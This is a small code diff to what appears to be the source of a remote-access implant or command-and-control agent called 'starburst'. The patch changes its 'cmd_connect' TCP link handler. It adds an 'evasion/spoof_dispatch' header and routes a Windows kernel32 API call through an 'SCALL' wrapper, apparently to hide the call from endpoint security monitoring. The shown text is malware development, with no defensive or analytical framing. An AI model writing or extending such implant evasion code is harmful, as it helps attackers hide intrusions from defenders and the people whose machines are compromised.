@@ -6,6 +6,7 @@
 #include <config.h>
 #include <strings.h>
 #include <base64.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_CONNECT
 
@@ -103,7 +104,7 @@ auto declfn starburst::cmd_connect(
     memory::zero( link, sizeof( instance::TcpLink ) );
     memory::copy( link->task_uuid, task_uuid, 36 );
 
-    link->link_id   = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
+    link->link_id   = (DWORD)SCALL( inst, kernel32.GetTickCount ) & 0x7FFFFFFF;
     link->socket    = sock;
     link->port      = static_cast<uint16_t>( port );
     link->connected = true;
